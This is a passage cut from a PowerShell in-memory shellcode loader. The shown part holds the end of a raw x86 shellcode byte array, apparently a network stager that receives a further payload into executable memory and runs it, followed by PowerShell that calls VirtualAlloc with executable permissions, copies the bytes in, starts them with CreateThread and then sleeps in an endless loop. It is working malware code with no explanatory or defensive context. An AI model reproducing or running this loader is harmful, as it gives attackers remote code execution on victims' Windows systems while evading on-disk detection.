x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

